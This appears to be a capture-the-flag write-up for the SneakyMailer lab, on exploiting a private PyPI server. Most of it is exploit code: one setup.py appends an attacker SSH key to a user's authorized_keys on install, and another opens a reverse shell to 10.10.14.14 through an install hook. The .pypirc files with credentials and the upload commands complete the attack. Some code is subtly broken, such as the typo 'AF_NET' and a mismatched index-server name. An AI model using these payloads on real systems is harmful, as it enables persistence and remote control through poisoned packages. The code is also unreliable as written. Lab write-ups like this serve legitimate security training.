## LOCAL exploitation
Payloads *setup.py*

```py
import setuptools
try:
   with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7u/534PEPy7tgqFRA1Yg7Va2uW7Hztfq7lZ9QMpL1cicJ8LXJFdEAYlB7AK9BjXzrLbw1Rwhm4utniV2eKUlLdr71WIX0yRs+m7ldPyYCs7dm5pqBHwMjO0k/G/V2iHxyucnkTrjVqBaeKydd+TW2GrUxexAvAZOJWc4Qsof130laG2YK5Hlc0YQI7aFMIOxOJewAUrn5PIcnyDyHOUdurEb0FTkvFGAZDLNvniG795BHnMAwa86GWOMMzLxfxm0ilPJgqFVEmQqd79kA+dnEMU7y7CPgSr2ENCd+HItDA5nCObxkFmd72+w3bdVQ9G54fA61m50g1ZxnWPq/1erhOwECSFM2MEUhQszI2X19iUmrFd81lRKpkGhHegRoRYlulIjJ6fjPmk4I7C9iDgqCLf0YeobotnfnLCsTSO5gT5EnOotMjxSMhPx1ur07c1bLKNprxPaEUNu9x+DiJfGtbtJWciOmVOoRUbYJ+pT0PU+w3IBZ8R38SlczmlK2Pss= no@no")
        f.close()
except Exception as e:
   pass
setuptools.setup(
name="example-pkg3", # Replace with your own username
version="0.0.1",
author="Example Author",
author_email="author@example.com",
description="A small example package",
long_description="",
long_description_content_type="text/markdown",
url="https://github.com/pypa/sampleproject",
packages=setuptools.find_packages(),
classifiers=[
"Programming Language :: Python :: 3",
"License :: OSI Approved :: MIT License",
"Operating System :: OS Independent",
],
)
```

PAYLOAD 2 *setup.py*
 ```py
 import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
   def run(self):
      RHOST = "10.10.14.14"
      RPORT = 443
      s = socket.socket(socket.AF_NET,socket.SOCK_STREAM)
      s.connect((RHOST,RPORT))
      for i in range(3):
         os.dup2(s.fileno(), i)
      p = subprocess.call(["/bin/sh","-i"])

setup(name='revshell',
   version='0.0.1',
   description='Reverse Shell',
   author='x3rz',
   author_email='x3rz',
   url='http://sneakycorp.htb',
   license='MIT',
   zip_safe=False,
   cmdclass={'install': Exploit})
 ```
 
 *.pypirc* (Remote)
 ```py
 [distutils]
index-servers =
  sneaky
[sneaky]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
 ```
 
*.pypirc*
```py
[distutils]
index-servers = local
[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

Download these two files in victim machine and then execute the command:
```bash
python3 setup.py sdist register -r local upload -r local
```

## REMOTE exploitation
==[Broken] (please see the sneakymailer writeup for Remote exploitation)==
- save any of the payload in a fiile and .pypirc file in same directory.

Commands to use:
```bash
# On local system
python3 setup.py sdist
```

Now we have `sdist` directory from which we can get our payload

Now create a .pypirc for remote file upload.

```py
[distutils]
index-servers =
  remote
[sneaky]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

Command to upload after all the setup:
```bash
python3 setup.py sdist upload -r remote
```

Now simply visit the pypi server simple directory and keep nc listner on `http://pypisneakycorp.htb:8080/simple`